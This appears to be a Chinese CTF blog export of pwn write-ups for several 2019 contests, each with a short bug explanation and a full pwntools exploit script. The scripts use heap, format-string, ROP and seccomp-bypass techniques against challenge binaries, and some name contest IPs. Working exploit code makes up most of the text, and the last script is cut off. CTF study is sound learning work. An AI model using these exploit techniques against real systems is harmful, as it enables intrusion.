    <content type="text"><![CDATA[前言：两道题的漏洞都是第一次见，可以理解为栈中的UAF，比较有趣，在这里记录一下。 pwn1:这题据广大的大佬说是2019Xman的最后一题，还是出的挺有新意的。 漏洞点：整数溢出+堆溢出+栈中UAF(leak) exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364#coding:utf-8from pwn import *path = './pwn'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(count): p.recvuntil('choice:') p.send('2') p.recvuntil('buy:') p.send('1') p.recvuntil('buy:') p.send(str(count))p.recvuntil('choice:')p.send('\x11'*0x8)p.recvuntil('\x11'*0x8)pro_base = u64(p.recv(6).ljust(8,'\x00')) - 0x8f0 log.success('pro_base = '+hex(pro_base))new(12558384)new(12558384)new(1)p.recvuntil('choice:')p.send('3')new(2)new(22)new(12558384)new(12558384)p.recvuntil('choice:')p.send('3')p.recvuntil('(y/n)\n')p.sendline('y')p.recvuntil('poor:')payload = p64(0)*3+p64(0x31)+p64(0)*2+p64(pro_base+0x204020)p.send(payload)p.recvuntil('choice:')p.send('3')p.recvuntil('2. Name: ')flag = p.recvuntil('.',drop = True)log.success('flag = '+flag)if attach == 1: gdb.attach(p)p.interactive() pwn2:据Ama2in9大佬说是国赛东北半决赛的最后一题，漏洞也比较有意思。 漏洞点：A，B两个函数共用一个栈环境，A函数残留的脏数据，会赋值给B函数中未初始化的变量。 可以理解为未初始化变量漏洞？我觉得也可以理解为栈中的UAF(修改变量)。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081#coding:utf-8from pwn import *path = './pwn'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(passwd,size,content): p.recvuntil('&gt;&gt; ') p.sendline('2') p.recvuntil('passwd:') p.send(passwd) p.recvuntil('size:') p.sendline(str(size)) p.recvuntil('Content:') p.send(content)def show(): p.recvuntil('&gt;&gt; ') p.sendline('1')def delete(passwd,index): p.recvuntil('&gt;&gt; ') p.sendline('4') p.recvuntil('passwd:') p.send(passwd) p.recvuntil('index:') p.sendline(str(index))def edit(passwd,index,content): p.recvuntil('&gt;&gt; ') p.sendline('3') p.recvuntil('passwd:') p.send(passwd) p.recvuntil('index:') p.sendline(str(index)) p.recvuntil('Content:') p.send(content)new('\x00'*0x28,0x460,'\x00'*0x460) #0new('\x00'*0x28,0x60,'\x00'*0x60) #1delete('\x00'*0x28,0)new('\x00'*0x28,0x60,'\n') #0show()p.recvuntil(': ')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f1aa15faf78-0x7f1aa1236000)log.success('libcbase = '+hex(libcbase))edit('\x00'*0x28,0,'\x11'*0x10+'\n')show()p.recvuntil('\x11'*0x10)heap_addr = u64(p.recv(6).ljust(8,'\x00')) - 0xb0log.success('heap_addr = '+hex(heap_addr))delete('\x00'*0x28,0)delete('\x00'*0x28,1)delete('\x00'*0x20+p64(heap_addr+0xc0),10)one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]new('\x00'*0x28,0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23)+'\n') #0new('\x00'*0x28,0x60,'\n') #1new('\x00'*0x28,0x60,'\n') #2new('\x00'*0x28,0x60,'\x00'*0x13+p64(libcbase+one_gadget[2])+'\n') #3delete('\x00'*0x28,3)if attach == 1: gdb.attach(p)p.interactive()]]></content>
      <categories>
        <category>CTF-PWN</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[2019ByteCTF / 2019OGeek / 2019SuCTF 大杂烩]]></title>
    <url>%2F2019%2F09%2F14%2F2019ByteCTF_2019OGeek_2019SuCTF%2F</url>
    <content type="text"><![CDATA[前言：唉，好久没写博客了。。。这次又来填坑。。。感觉现在写wp越来越懒得分析，基本能说一句话都不想说第二句。。。这里包含了最近的几场比赛的glibc的题目（没错，咸鱼除了glibc还能做什么呢？呵呵）。。需要的话自取。。。 2019ByteCTF / 2019OGeek / 2019SuCTF 要开始准备拟态防御专题和内核的东西了。。。。队里开始换届。。。。要开始做扛旗的准备。 ByteCTF-mulnote:加了OLLVM混淆的ELF，拿到的时候一脸懵逼，后来发现程序逻辑还是蛮简单的，UAF的洞也很明显。比较坑的一个点是最后的时候要等所有的线程结束再触发__malloc_hook，所以最后要等个10秒钟，不然肯定会错。原因大概是线程结束时，主线程已经拿了shell，可能在结束处理时栈会有问题从而报错。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283#coding:utf-8from pwn import *path = './mulnote'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size,content): p.recvuntil('&gt;') p.sendline('C') p.recvuntil('size&gt;') p.sendline(str(size)) p.recvuntil('note&gt;') p.send(content)def edit(index,content): p.recvuntil('&gt;') p.sendline('E') p.recvuntil('index&gt;') p.sendline(str(index)) p.recvuntil('note&gt;') p.send(content)def show(): p.recvuntil('&gt;') p.sendline('S')def delete(index): p.recvuntil('&gt;') p.sendline('R') p.recvuntil('index&gt;') p.sendline(str(index))new(0x80,'\x00'*(0x80-1))#gdb.attach(p)delete(0)sleep(1)show()p.recvuntil('[*]note[0]:\n')libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f45442cdb78-0x7f45442d3000) - (0x4ce000-0x104000)log.success('libcbase = '+hex(libcbase))sleep(9)new(0x60,'\x00'*0x5f) #0new(0x60,'\x11'*0x5f) #1delete(0)sleep(0.5)delete(1)sleep(0.5)delete(0)sleep(0.5)one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147]new(0x60,p64(libcbase+libc.sym['__malloc_hook']-0x23)) new(0x60,'\x11'*0x5f) new(0x60,'\x22'*0x5f) new(0x60,'\x00'*0xb+p64(libcbase+one_gadget[2])+p64(libcbase+libc.sym['realloc'])) sleep(10)p.recvuntil('&gt;')p.sendline('C')p.recvuntil('size&gt;')p.sendline(str(16))#gdb.attach(p)if attach == 1: gdb.attach(p)p.interactive() ByteCTF-mheap:当时比赛时看了半小时，没看出哪有问题，找到一个整数溢出，但是利用不了，出现了链表，大概能猜到是利用溢出伪造一个链表指针，在程序遍历lastptr寻找相同大小size的指针时劫持程序的chunk到got表，从而泄露libc，劫持执行流。 但是却没找到溢出点，在几个输入点都看了半天都没问题。。。最后看了队长的exp，是利用read()返回值检查的漏洞，结合read本身出错时的特性来利用的。。。。是个新姿势。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from pwn import *def add(p, idx, size, content): p.sendlineafter('Your choice: ', str(1)) p.sendlineafter('Index: ', str(idx)) p.sendlineafter('size: ', str(size)) if size == len(content): p.sendafter('Content: ', content) else: p.sendlineafter('Content: ', content)def show(p, idx): p.sendlineafter('Your choice: ', str(2)) p.sendlineafter('Index: ', str(idx))def delete(p, idx): p.sendlineafter('Your choice: ', str(3)) p.sendlineafter('Index: ', str(idx))def edit(p, idx, content): p.sendlineafter('Your choice: ', str(4)) p.sendlineafter('Index: ', str(idx)) p.send(content)def pwn(): context.log_level = 'debug' context.terminal = ['tmux', 'split', '-h'] DEBUG = 1 libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') elf = ELF('./mheap') if DEBUG: p = process('./mheap') else: p = remote('112.126.98.5', 9999) add(p, 0, 0x1000 - 0x40 - 0x20, 'sunichi') #1 add(p, 1, 0x10, 'sunichi') #2 add(p, 2, 0x10, 'sunichi!'*2) #3 delete(p, 1) #4 delete(p, 2) #5 p.sendlineafter('Your choice: ', str(1)) #6 p.sendlineafter('Index: ', str(15)) p.sendlineafter('size: ', str(0x60)) gdb.attach(p) payload = p64(0x20) + p64(0x4040cb) + p64(0) * 2 + p64(0x70) + p64(0)[:7] + '\n' p.sendafter('Content: ', payload) add(p, 1, 0x10, '/bin/sh\x00') #7 payload = 'a' * 5 + p64(elf.got['puts']) add(p, 14, 0x10, payload) #8 show(p, 0) libc.address = u64(p.recv(6) + '\x00\x00') - libc.symbols['puts'] log.success('libcbase = '+hex(libc.address)) p.sendlineafter('Your choice: ', str(4)) p.sendlineafter('Index: ', str(0)) p.send(p64(libc.address + 0x4f322)) p.sendline('sun') p.interactive()if __name__ == '__main__': pwn() impeccable-Artifact(hitcon-2017-qual)：这道题考的是沙箱过滤器的读取能力，算是入门沙箱过滤的基础题。 exp如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#coding:utf-8from pwn import *path = './artifact'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()p.recvuntil('Choice?\n')p.sendline('1')p.recvuntil('Idx?\n')p.sendline(str(0x658/8))p.recvuntil('is: ')libcbase = int(p.recvuntil('\n'),10) - libc.sym['__libc_start_main']-240log.success('libcbase = '+hex(libcbase))p.recvuntil('Choice?\n')p.sendline('1')p.recvuntil('Idx?\n')p.sendline(str(0x650/8))p.recvuntil('is: ')baseaddr = int(p.recvuntil('\n'),10) - 0xbb0log.success('baseaddr = '+hex(baseaddr))p.recvuntil('Choice?\n')p.sendline('1')p.recvuntil('Idx?\n')p.sendline(str(0x668/8))p.recvuntil('is: ')flag_addr = int(p.recvuntil('\n'),10) - 0x100log.success('stack_addr = '+hex(flag_addr))p.recvuntil('Choice?\n')p.sendline('2')p.recvuntil('Idx?\n')p.sendline(str(0x640/8))p.recvuntil('number:\n')p.sendline(str(int('0x67616c66',16)))p_rdx_rsi = libcbase + 0x1150c9p_rdi = libcbase + 0x21102 bss = 0x202a00 + baseaddrrop = [ p_rdx_rsi,2,0,p_rdi,flag_addr+8,libcbase+libc.sym['open'], p_rdx_rsi,0x100,bss,p_rdi,3,libcbase+libc.sym['read'], p_rdx_rsi,0x100,bss,p_rdi,1,libcbase+libc.sym['write'] ]for i in range(18): p.recvuntil('Choice?\n') p.sendline('2') p.recvuntil('Idx?\n') p.sendline(str((0x658+i*8)/8)) p.recvuntil('number:\n') p.sendline(str(rop[i]))p.recvuntil('Choice?\n')p.sendline('3')if attach == 1: gdb.attach(p)p.interactive() ByteCTF-vip:这题开始做的时候很懵逼，become_vip里的溢出完全不知道怎么用。。。并不知道name数组后面的那些变量意味着什么。比赛结束后上网查阅关于沙箱过滤的资料，学到了不少东西。还是有比要记录一下的。hhhhh 这两篇链接讲的不错，安利一下：（后来了解到原来这种过滤规则是tcp协议包的过滤规则格式。。。果然不能被方向遮住了视野。。） 传送门一号 传送门二号 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135#coding:utf-8from pwn import *path = './vip'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['tmux','split','-h'])context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(index): p.recvuntil('choice: ') p.sendline('1') p.recvuntil('Index: ') p.sendline(str(index))def delete(index): p.recvuntil('choice: ') p.sendline('3') p.recvuntil('Index: ') p.sendline(str(index))def edit(index,size,content): p.recvuntil('choice: ') p.sendline('4') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil('Size: ') p.sendline(str(size)) p.recvuntil('Content: ') p.send(content)def show(index): p.recvuntil('choice: ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index))def vip(name): p.recvuntil('choice: ') p.sendline('6') p.recvuntil('name: \n') p.send(name)''' line CODE JT JF K================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x08 0xc000003e if (A != ARCH_X86_64) goto 0010 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x06 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0010 0004: 0x15 0x04 0x00 0x00000001 if (A == write) goto 0009 0005: 0x15 0x03 0x00 0x00000000 if (A == read) goto 0009 0006: 0x15 0x02 0x00 0x00000002 if (A == open) goto 0009 0007: 0x15 0x01 0x00 0x0000003c if (A == exit) goto 0009 0008: 0x06 0x00 0x00 0x00050005 return ERRNO(5) 0009: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0010: 0x06 0x00 0x00 0x00000000 return KILL'''name = '\x00'*0x20name+= p16(0x20)+p8(0)+p8(0)+p32(0) #0:A = sys_numbername+= p16(0x15)+p8(1)+p8(0)+p32(0x101) #1:if (A == openat) goto 0003name+= p16(0x35)+p8(1)+p8(0)+p32(0) #2:if (A &gt;= 0x0) goto 0004name+= p16(0x06)+p8(0)+p8(0)+p32(0x00050000) #3:return ERRNO(0)name+= p16(0x06)+p8(0)+p8(0)+p32(0x7fff0000) #4:return ALLOWvip(name)for i in range(16): new(i)payload = '\x00'*0x58 + p64(0x421)edit(0,0x60,payload)delete(1)new(1)show(1)libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7fd4223d9090-0x00007fd421fed000)log.success('libcbase = '+hex(libcbase))payload = '\x00'*0x58 + p64(0x61)edit(1,0x60,payload)delete(1)payload = '\x00'*0x58 + p64(0x61) + p64(0x404100)edit(0,0x68,payload)new(0)new(1)payload = p64(0x404100) + p64(libcbase+libc.sym['environ'])edit(1,0x10,payload)show(1)ret_addr = u64(p.recv(6).ljust(8,'\x00')) - 0xf0 log.success('ret_addr = '+hex(ret_addr))payload = p64(0x404100) + p64(0x404a00)edit(0,0x10,payload)edit(1,4,'flag')p_rdx_rsi = 0x1306d9 + libcbasep_rdi = 0x2155f + libcbasep_rax = 0x439c8 + libcbase syscall = 0xd2975 + libcbasebss = 0x404b00flag_addr = 0x404a00rop = [ p_rdx_rsi,0,0,p_rdi,flag_addr,p_rax,2,syscall, p_rdx_rsi,0x100,bss,p_rdi,3,libcbase+libc.sym['read'], p_rdx_rsi,0x100,bss,p_rdi,1,libcbase+libc.sym['write'] ]for i in range(20): payload = p64(0x404100) + p64(ret_addr+8*i) edit(0,0x10,payload) edit(1,8,p64(rop[i]))p.recvuntil('choice: ')p.sendline('5')if attach == 1: gdb.attach(p)p.interactive() 意外收获：我们平时所用的read，open，write内部都是通过系统调用实现的，他们其实真正的名字叫GI___libc_read，__GI___libc_write，__libc_open64，其内部的系统调用read就为read，write就为write，但是open却不是open，而是openat。open的系统调用号为0，openat的系统调用号是0x101，如下图所示： 所以我们最后rop时，虽然我们禁用了openat的系统调用，但可以直接调用open的系统调用来打开文件进行读写，如果调用open函数来打开文件就会失败。 ByteCTF-note_five:这题算是一道在基础的利用方式上进行了小创新了吧。 先看程序，发现没有show函数，而且new的chunk的size限制了大小，最小可申请0x90，这就把常规的fastbin_attack禁用了，再发现有off-by-one，可以chunkoverlapping。 大致思路为：用off-by-one导致chunkoverlapping，然后unsortedbin_attack攻击global_max_fast到这里可能都比较简单，之后可能就有点点难度了，利用文件结构体里的0xffffffffffffffff的头部0xff来作为chunk的size，然后就需要好几次二次写，最后改malloc_hook。 中间的有一个地方做的时候开始没看清楚耽误了很长时间，就是new的时候会直接把存在的指针给覆盖掉，不需要先清零。。。。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154#coding:utf-8from pwn import *path = './note_five'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(index,size): p.recvuntil('choice&gt;&gt; ') p.sendline('1') p.recvuntil('idx: ') p.sendline(str(index)) p.recvuntil('size: ') p.sendline(str(size))def delete(index): p.recvuntil('choice&gt;&gt; ') p.sendline('3') p.recvuntil('idx: ') p.sendline(str(index))def edit(index,content): p.recvuntil('choice&gt;&gt; ') p.sendline('2') p.recvuntil('idx: ') p.sendline(str(index)) p.recvuntil('content: ') p.send(content)def pwn(): new(0,0xa8) #0 new(1,0xe8) #1 ---&gt; new(2,0xe8) #2 ---&gt; new(3,0xf8) #3 new(4,0xe8) #4 payload = '\x00'*0xe0 + p64(0x1e0+0xb0) + '\x00' edit(2,payload+'\n') delete(0) payload = '\x00'*0xf8 + '\x71' edit(3,payload) edit(4,'\x00'*0x68+'\x21'+'\n') delete(3) delete(4) new(0,0xa8) new(3,0xe8) #1 3 new(4,0xe8) #2 4 delete(1) payload = p64(0)+'\xe8\xb7' edit(3,payload+'\n') new(1,0xe8) edit(0,'\x00'*0xa8 + '\xa1') edit(1,'\x00'*0x98 + '\x21' + '\n') delete(1) edit(3,'\xf0'+'\n') new(1,0x90) edit(0,'\x00'*0xa8 + '\x71') edit(1,'\x00'*0x68 + '\x21' + '\n') delete(1) delete(2) edit(4,'\xcf\xa5'+'\n') new(2,0xe8) payload = '\x00'*(0x41-8) + p64(0xf1) + p64(0xfbad1800) + p64(0)*3 + '\x00' new(1,0xe8) edit(1,payload+'\n') p.recv(0x40) libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f64c496a600-0x00007f64c45a5000) log.success('libcbase = '+hex(libcbase)) delete(2) edit(4,p64(libcbase+(0x7f2b014f996f-0x7f2b01135000))+'\n') new(2,0xe8) new(1,0xe8) payload = '\x00' + p64(libcbase+0x7f4a55bf99c0-0x7f4a55835000) + '\x00'*0x30 payload+= p64(libcbase+0x7f4a55bf86e0-0x7f4a55835000) + '\x00'*0x10 + p64(0)*17+p64(0xff) edit(1,payload+'\n') delete(2) edit(4,p64(libcbase+(0x7fdfd6589a50-0x7fdfd61c5000))+'\n') new(2,0xe8) new(1,0xe8) one_gadget = [0x45216,0x4526a,0xf1147,0xf02a4] payload = p64(0)*18 payload+= p64(libcbase+0x7fdfd6588260-0x7fdfd61c5000) + p64(0) payload+= p64(libcbase+0x7fdfd624ae20-0x7fdfd61c5000) + p64(libcbase+0x7fdfd624aa00-0x7fdfd61c5000) payload+= p64(libcbase+one_gadget[3]) edit(1,payload+'\n') delete(1) ''' delete(2) fd = libcbase + (0x7f71b971a610-0x7f71b9355000) edit(4,p64(fd)+'\n') edit(0,'\x00'*0xe8 + '\x61') edit(3,'\x00'*0x58 + '\x21'+'\n') delete(3) new(2,0xe8) new(3,0xe8) one_gadget = [0x45216,0x4526a,0xf02a4,0xf1147] fake_file = p64(0xfbad2887) + p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x83) fake_file+= p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x83) + p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x83) fake_file+= p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x83) + p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x83) fake_file+= p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x83) + p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x83) fake_file+= p64(libcbase+libc.sym['_IO_2_1_stdout_']+0x84) + p64(0) fake_file+= p64(0) + p64(0) fake_file+= p64(0) + p64(libcbase+libc.sym['_IO_2_1_stdin_']) fake_file+= p64(1) + p64(0xffffffffffffffff) fake_file+= p64(0x000000000b000000) + p64(libcbase+(0x7f9ec759b780-0x7f9ec71d5000)) # fake_file+= p64(0xffffffffffffffff) + p64(0) fake_file+= p64(libcbase+( 0x7f95d53c97a0-0x00007f95d5005000)) + p64(0) fake_file+= p64(0) + p64(0) fake_file+= p64(0xffffffff) + p64(0) fake_file+= p64(0) + p64(libcbase+libc.sym['_IO_2_1_stdout_']+0xd8-0x30) edit(3,fake_file+'\n') ''' if attach == 1: gdb.attach(p) p.interactive()while True: try: pwn() break except: p.close() p = process('./note_five') 意外收获： 上图这种堆的排布方式还是蛮好用的，特别是在off-by-one时： 12345678910111213new(1,0x98)new(2,0x98)new(3,0x98)#这里还要申请一个chunk来隔开topchunk，我没写delete(1)payload = '\x00'*0x90 + p64(0x140) + '\xa0'edit(2,payload)delete(3) #合并new(4,0xe8)new(5,0xe8)#这时候就可以用chunk2来控制chunk5了delete(5)edit(2,'\x00'*0x40 + p64(prevsize_chunk5) + p64(size_chunk5) + ..........) 如果是off-by-null的话，我们可以参考如下结构，（这是开启了mallocp(0) 的）： 123456789101112131415161718192021222324252627add(0x78) #0add(0x78) #1add(0x78) #2add(0x78) #3add(0x78) #4add(0x78) #5add(0x78) #6add(0x78) #7delete(3) delete(4)delete(5)payload = '\x00' * 0x78edit(2, payload)add(0x78) #3add(0x78) #4delete(3)delete(6)add(0x78) #3add(0x78) #5 4 &lt;==&gt; 5add(0x78) #6 SUCTF-二手破电脑：漏洞点在于scanf(&quot;%s&quot;)时会在结尾处加一个\x00，造成off-by-null，可以chunkoverlapping，然后使name_ptr指向自己，然后在rename里就可以改name_ptr为free_hook，然后改free_hook为system的地址。 堆块构造可能有些复杂，需要先提前做好规划。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136#coding:utf-8from pwn import *path = './pwn'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote()def new(size,content): p.recvuntil('&gt;&gt;&gt; ') p.sendline('1') p.recvuntil(' length: ') p.sendline(str(size)) p.recvuntil('Name: ') p.sendline(content) p.recvuntil('Price: ') p.sendline('66')def comment(index,content): p.recvuntil('&gt;&gt;&gt; ') p.sendline('2') p.recvuntil('Index: ') p.sendline(str(index)) p.recvuntil(': ') p.send(content) p.recvuntil(': ') p.sendline('66')def delete(index): p.recvuntil('&gt;&gt;&gt; ') p.sendline('3') p.recvuntil('index: ') p.sendline(str(index))def rename(index,new_content_1,new_content,isGetPower='y',serial='e4SyD1C!'): p.recvuntil('&gt;&gt;&gt; ') p.sendline('4') p.recvuntil('index: ') p.sendline(str(index)) p.send(new_content_1) p.recvuntil('Wanna get more power?(y/n)') p.sendline(isGetPower) if isGetPower == 'y': p.recvuntil('Give me serial: ') p.send(serial) raw_input() p.send('\n') p.recvuntil('Hey Pwner') p.send(new_content)new(0x18,'\x00'*0x10) #0comment(0,'\x00'*0x10)new(0x18,'\x00'*0x10) #1delete(0)new(0x18,'\x11'*4)comment(0,'\x11'*4)delete(0)p.recvuntil('\x11'*4)libcbase = u32(p.recv(4)) - (0xf7ebd7b0-0xf7d0b000)log.success('libcbase = '+hex(libcbase))comment(1,'\x00'*0x10)new(0x18,'\x00'*0x10) #0new(0x18,'\x00'*0x10) #2 new(0x18,'\x00'*0x10) #3new(0x18,'\x00'*0x10) #4new(0x18,'\x00'*0x10) #5new(0x18,'\x00'*0x10) #6comment(0,'\x00'*0x10)comment(2,'\x00'*0x10)comment(3,'\x00'*0x10)comment(4,'\x00'*0x10)comment(5,'\x00'*0x10)comment(6,'\x00'*0x10)new(0x18,'\x00'*0x10) #7delete(0)for i in range(5): delete(i+2)comment(7,'\x77'*0x8)delete(7)p.recvuntil('\x77'*8)heapbase = u32(p.recv(4)) - 0x248log.success('heapbase = '+hex(heapbase))new(0x78,'\x00') #0new(0x78,'\x00') #2new(0x78,'\x00') #3new(0x78,'\x00') #4new(0x78,'\x00') #5new(0x68,'\x00') #6new(0x68,'\x00') #7delete(0)delete(2)delete(3)delete(4)new(0x7c,'\x11'*0x7c) #0new(0x5c,'\x22'*0x58+'\x60') #2new(0x8,'\x33'*8) #3new(0x8,'\x44'*8) #4new(0x60,'\x99'*0x60) #9delete(2)delete(5)new(0x68,'/bin/sh\x00'+'\x22'*0x60) #2payload = p32(0)*3 + p32(0x29) + p32(0) + p32(heapbase+0x350) + '\x00'*0x18 + p32(0) + p32(0x29)new(0x88,payload) #5rename(8,p32(libcbase+libc.sym['__free_hook'])*2,p32(libcbase+libc.sym['system']))if attach == 1: gdb.attach(p)p.interactive() SUCTF-playfmt:程序在最开始会把flag放进堆里，然后我们用格式化字符串把他读出来就行了，常规的bss段的格式化字符串。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#coding:utf-8from pwn import *path = './playfmt'debug = 0attach = 0#P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('120.78.192.35',9999)p.recvuntil('=====================\n')p.recvuntil('=====================\n')p.send('%18$p')heapbase = int(p.recv(10),16) - (0x86bea28-0x086ba000)log.success('heapbase = '+hex(heapbase))sleep(0.5)#gdb.attach(p,'b *0x0804889f')p.send('%6$p')stack = int(p.recv(10),16)log.success('stack = '+hex(stack))sleep(0.5)#gdb.attach(p,'b *0x0804889f')one_str = str(hex(stack+2))[-4:]one_str = int(one_str,16)log.success('one_str = '+hex(one_str))p.send('%'+str(one_str)+'c%6$hn'+'\x00')p.recv()sleep(0.5)#gdb.attach(p,'b *0x0804889f')two_str = '0'+str(hex(heapbase+0x4a10))[-7:-4]two_str = int(two_str,16)log.success('two_str = '+hex(two_str))p.send('%'+str(two_str)+'c%14$hn'+'\x00')p.recv()sleep(0.5)#gdb.attach(p,'b *0x0804889f')three_str = str(hex(heapbase+0x4a10))[-4:]three_str = int(three_str,16)log.success('three_str = '+hex(three_str))p.send('%'+str(three_str)+'c%6$hn'+'\x00')p.recv()sleep(0.5)p.send('%14$s'+'\x00')if attach == 1: gdb.attach(p,'b *0x0804889f')p.interactive() OGeek-hub:反向溢出漏洞，2.27环境，导致了doublefree，需要注意一些细节，其他没什么。 exp如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116#coding:utf-8from pwn import *path = './hub'debug = 1attach = 0#P = ELF(path)context(os='linux',arch='amd64',timeout = 0.5)#,terminal=['terminator','-x','sh','-c'])context.terminal = ['tmux','splitw','-h']#context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6')else: p = remote('47.112.139.218',13132) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def new(size): p.recvuntil('&gt;&gt;') p.sendline('1') p.recvuntil('stay?\n') p.sendline(str(size))def delete(offset): p.recvuntil('&gt;&gt;') p.sendline('2') p.recvuntil('want?\n') p.sendline(offset)def upgrade(payload): p.recvuntil('&gt;&gt;') p.sendline('3') p.recvuntil('want?\n') p.send(payload)def pwn(): new(0x40) new(0xa0) new(0x90) new(0x20) delete('-'+str(0xa0)) delete('-'+str(0xa0)) delete('-'+str(0xa0+0xa0+0x10)) delete('-'+str(0xa0+0xa0+0x10)) delete('-'+str(0xa0+0xa0+0x10+0x40+0x10)) delete('-'+str(0xa0+0xa0+0x10+0x40+0x10)) new(0x90) new(0x90) new(0x90) delete('0') new(0x30) upgrade('\x60\x27') new(0x90) new(0x90) upgrade(p64(0xfbad1800)) new(0x50) new(0xa0) new(0xa0) new(0xa0) delete('0') new(0x30) upgrade('\x80\x27') new(0xa0) new(0xa0) upgrade('\x00') p.recvuntil('\x00'*8) libcbase = u64(p.recv(6).ljust(8,'\x00')) - (0x7f1995c238b0-0x7f1995836000) log.success('libcbase = '+hex(libcbase)) new(0x40) upgrade(p64(libcbase+libc.sym['__free_hook'])) new(0x40) new(0x40) upgrade(p64(libcbase+libc.sym['system'])) new(0x60) upgrade('/bin/sh\x00') delete('0') if attach == 1: gdb.attach(p) p.interactive()while True: try: pwn() break except: p.close() if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = ELF('/lib/i386-linux-gnu/libc.so.6') else: p = remote('47.112.139.218',13132) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') OGeek-babyrop:利用溢出使strncmp()的第三个参数为0来绕过随机数检查，之后进行rop即可，第二次回来时可能需要调试找偏移。 exp如下：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#coding:utf-8from pwn import *path = './babyrop'debug = 0attach = 0#P = ELF(path)context(os='linux',arch='i386',terminal=['terminator','-x','sh','-c'])context.log_level = 'debug'if debug == 1: p = process(path) if context.arch == 'amd64': libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') else: libc = 